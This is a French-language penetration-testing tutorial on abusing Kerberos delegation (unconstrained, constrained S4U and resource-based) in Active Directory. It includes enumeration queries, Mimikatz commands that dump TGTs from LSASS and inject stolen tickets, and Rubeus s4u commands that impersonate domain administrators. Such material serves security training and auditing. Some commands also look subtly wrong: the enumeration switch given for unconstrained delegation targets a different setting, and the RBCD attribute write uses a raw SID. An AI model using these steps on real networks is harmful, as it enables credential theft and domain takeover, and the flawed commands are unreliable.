# V.C. Abus des Délégations Kerberos

La délégation Kerberos permet à un service d'agir au nom d'un utilisateur pour accéder à d'autres services sur le réseau. Des configurations de délégation incorrectes ou compromises peuvent être abusées pour élever des privilèges ou se déplacer latéralement.

Il existe principalement trois types de délégation :
1.  **Délégation Non Contrainte (Unconstrained Delegation)**
2.  **Délégation Contrainte (Constrained Delegation - S4U2Self & S4U2Proxy)**
3.  **Délégation Contrainte Basée sur les Ressources (Resource-Based Constrained Delegation - RBCD)**

## 1. Délégation Non Contrainte (Unconstrained Delegation)

*   **Principe :** Un compte (utilisateur ou ordinateur) configuré pour la délégation non contrainte peut obtenir une copie du Ticket Granting Ticket (TGT) d'un utilisateur qui s'authentifie auprès de lui. L'attaquant peut ensuite utiliser ce TGT pour s'authentifier en tant que cet utilisateur auprès d'autres services.
*   **Identification :**
    *   Rechercher l'attribut `userAccountControl` contenant le flag `TRUSTED_FOR_DELEGATION` (524288 ou 0x80000).
    *   **PowerView :**
        ```powershell
        Get-DomainUser -TrustedToAuth | Select-Object samaccountname, userprincipalname, serviceprincipalname, description
        Get-DomainComputer -TrustedToAuth | Select-Object samaccountname, dnshostname, serviceprincipalname, description
        ```
    *   **Module ActiveDirectory :**
        ```powershell
        Get-ADObject -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)" -Properties samaccountname, serviceprincipalname, dnshostname, userprincipalname | Select-Object Name, ObjectClass, DistinguishedName, samaccountname, serviceprincipalname, dnshostname, userprincipalname
        ```
    *   **BloodHound :** Requête "Find computers with unconstrained delegation".
*   **Exploitation :**
    1.  Compromettre le compte/la machine configurée pour la délégation non contrainte (ex: via RDP, WinRM, exploit).
    2.  Attendre qu'un utilisateur privilégié (ex: Administrateur de Domaine) s'authentifie sur cette machine.
    3.  Extraire le TGT de l'utilisateur privilégié de la mémoire LSASS.
        *   **Mimikatz :**
            ```
            privilege::debug
            sekurlsa::tickets /export
            # Rechercher le TGT de l'utilisateur cible.
            ```
    4.  Utiliser le TGT volé (Pass-the-Ticket) pour accéder à d'autres services en tant que l'utilisateur privilégié.
        *   **Mimikatz :**
            ```
            kerberos::ptt <chemin_vers_le_fichier_ticket.kirbi>
            ```
        *   **Rubeus :**
            ```powershell
            Rubeus.exe ptt /ticket:<BASE64_DU_TICKET_KIRBI>
            ```
*   **Risques :** Très dangereux. Si un DC est configuré pour la délégation non contrainte (mauvaise pratique), compromettre un service sur ce DC peut mener à la compromission de TGTs d'admins.

## 2. Délégation Contrainte (Constrained Delegation - S4U)

*   **Principe :**
    *   **S4U2Self (Service for User to Self) :** Un service peut obtenir un ticket de service pour lui-même au nom d'un utilisateur, même si cet utilisateur ne s'est pas authentifié directement auprès du service via Kerberos.
    *   **S4U2Proxy (Service for User to Proxy) :** Après S4U2Self, le service peut utiliser le ticket obtenu pour demander un autre ticket de service à un service backend (spécifié dans la configuration de délégation) au nom de l'utilisateur.
*   **Identification :**
    *   Rechercher les comptes avec l'attribut `msDS-AllowedToDelegateTo` configuré.
    *   **PowerView :**
        ```powershell
        Get-DomainUser -TrustedToDelegate | Select-Object samaccountname, userprincipalname, msdsallowedtodelegateto, description
        Get-DomainComputer -TrustedToDelegate | Select-Object samaccountname, dnshostname, msdsallowedtodelegateto, description
        ```
    *   **Module ActiveDirectory :**
        ```powershell
        Get-ADObject -Filter {'msDS-AllowedToDelegateTo' -like "*"} -Properties samaccountname, msDS-AllowedToDelegateTo, serviceprincipalname, dnshostname, userprincipalname | Select-Object Name, ObjectClass, DistinguishedName, samaccountname, msDSAllowedToDelegateTo, serviceprincipalname, dnshostname, userprincipalname
        ```
    *   **BloodHound :** Requêtes pour les chemins de délégation contrainte.
*   **Exploitation (si le compte de service est compromis) :**
    1.  L'attaquant a compromis un compte (A) configuré pour déléguer à un service spécifique (ex: `CIFS/SERVEUR_CIBLE`).
    2.  L'attaquant peut utiliser les extensions S4U pour obtenir un ticket de service pour `CIFS/SERVEUR_CIBLE` au nom de n'importe quel utilisateur (qu'il peut spécifier, souvent un admin).
    *   **Rubeus :**
        ```powershell
        # Compte A (attaquant) : service_compte
        # Utilisateur à impersonner : admin_cible
        # Service cible : CIFS/serveur_cible.domaine.local
        Rubeus.exe s4u /user:service_compte /password:MotDePasseService /impersonateuser:admin_cible /msdsspn:CIFS/serveur_cible.domaine.local /altservice:krbtgt /ptt
        # Ou si vous avez le hash NTLM du compte de service
        Rubeus.exe s4u /user:service_compte /rc4:HASH_NTLM_SERVICE /impersonateuser:admin_cible /msdsspn:CIFS/serveur_cible.domaine.local /altservice:krbtgt /ptt
        ```
        L'option `/altservice:krbtgt` (ou un autre service sur le DC comme `LDAP/DC.domaine.local`) est souvent utilisée pour obtenir un TGT pour l'utilisateur impersonné si la délégation est vers un service sur un DC.
    *   **Impacket `getST.py` (avec `ticketer.py`) :**
        ```bash
        # 1. Obtenir un TGT pour le compte de service (si nécessaire)
        # getTGT.py DOMAINE/service_compte:MotDePasseService
        # export KRB5CCNAME=/tmp/service_compte.ccache
        # 2. Demander un ticket S4U
        # getST.py -spn CIFS/serveur_cible.domaine.local -impersonate admin_cible DOMAINE/service_compte
        # (Peut nécessiter des ajustements pour l'utilisation du ticket)
        ```
*   **Transition de protocole :** Si la délégation contrainte est configurée avec "Utiliser n'importe quel protocole d'authentification" (transition de protocole), un attaquant qui compromet le service peut impersonner des utilisateurs s'authentifiant avec NTLM.

## 3. Délégation Contrainte Basée sur les Ressources (RBCD)

*   **Principe :** Inverse de la délégation contrainte. Ici, le propriétaire d'une ressource (ex: un serveur) configure quels comptes de service sont autorisés à déléguer vers sa ressource. L'attribut `msDS-AllowedToActOnBehalfOfOtherIdentity` sur l'objet ordinateur de la ressource est configuré avec le SID du compte de service autorisé.
*   **Identification :**
    *   Rechercher les objets ordinateurs avec l'attribut `msDS-AllowedToActOnBehalfOfOtherIdentity` configuré.
    *   **PowerView :**
        ```powershell
        Get-DomainComputer -LDAPFilter "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" | Select-Object samaccountname, dnshostname, msdsallowedtoactonbehalfofotheridentity
        ```
    *   **Module ActiveDirectory :**
        ```powershell
        Get-ADComputer -Filter {'msDS-AllowedToActOnBehalfOfOtherIdentity' -like "*"} -Properties msDSAllowedToActOnBehalfOfOtherIdentity | Select-Object Name, DistinguishedName, msDSAllowedToActOnBehalfOfOtherIdentity
        ```
*   **Exploitation (si l'attaquant a des droits d'écriture sur l'objet ordinateur cible ou contrôle un compte déjà listé dans `msDS-AllowedToActOnBehalfOfOtherIdentity`) :**
    1.  **Scénario 1 : L'attaquant a `WriteProperty` ou `GenericWrite`/`GenericAll` sur l'ordinateur cible (OrdinateurB).**
        *   L'attaquant crée un nouveau compte machine (OrdinateurA) ou utilise un compte machine qu'il contrôle.
        *   L'attaquant modifie l'attribut `msDS-AllowedToActOnBehalfOfOtherIdentity` de OrdinateurB pour y ajouter le SID de OrdinateurA.
            ```powershell
            # Avec PowerView
            # $computerB = Get-DomainComputer OrdinateurB
            # $computerA_SID = (Get-DomainComputer OrdinateurA).ObjectSid.Value
            # Set-ADObject $computerB -Add @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$computerA_SID} # Nécessite des droits
            # Ou plus directement avec des outils comme activedirectory.py d'Impacket ou des scripts PowerShell dédiés.
            # Rubeus peut aussi aider à configurer cela si on a les droits.
            ```
    2.  **Scénario 2 : L'attaquant contrôle déjà un compte (CompteSvc) listé dans `msDS-AllowedToActOnBehalfOfOtherIdentity` de l'OrdinateurB.**
    3.  **Exploitation (commune aux deux scénarios) :**
        *   L'attaquant (contrôlant OrdinateurA ou CompteSvc) utilise S4U2Self pour obtenir un ticket de service pour lui-même (OrdinateurA/CompteSvc) au nom d'un utilisateur qu'il veut impersonner (ex: Administrateur de Domaine) sur OrdinateurB.
        *   Puis, il utilise S4U2Proxy pour demander un ticket de service pour un service sur OrdinateurB (ex: `CIFS/OrdinateurB.domaine.local`) au nom de l'utilisateur impersonné.
        *   **Rubeus :**
            ```powershell
            # Attaquant contrôle OrdinateurA (ou son mot de passe/hash)
            # Veut accéder à CIFS/OrdinateurB.domaine.local en tant que 'admin_cible'
            Rubeus.exe s4u /user:OrdinateurA$ /password:MotDePasseMachineA /impersonateuser:admin_cible /msdsspn:CIFS/OrdinateurB.domaine.local /altservice:CIFS /ptt
            # Ou avec le hash NTLM de OrdinateurA$
            Rubeus.exe s4u /user:OrdinateurA$ /rc4:HASH_NTLM_MACHINE_A /impersonateuser:admin_cible /msdsspn:CIFS/OrdinateurB.domaine.local /altservice:CIFS /ptt
            ```
        *   Une fois le ticket injecté (`/ptt`), l'attaquant peut accéder au service sur OrdinateurB en tant que `admin_cible`.

## Outils Clés
*   **Rubeus :** Essentiel pour l'exploitation des délégations.
*   **Mimikatz :** Pour extraire les TGTs (délégation non contrainte) et injecter des tickets.
*   **PowerView / Module ActiveDirectory :** Pour l'énumération.
*   **BloodHound :** Pour visualiser les chemins de délégation.
*   **Impacket (getST.py, ticketer.py) :** Utile depuis Linux.

L'abus de délégation est une technique puissante mais complexe, nécessitant une bonne compréhension de Kerberos. 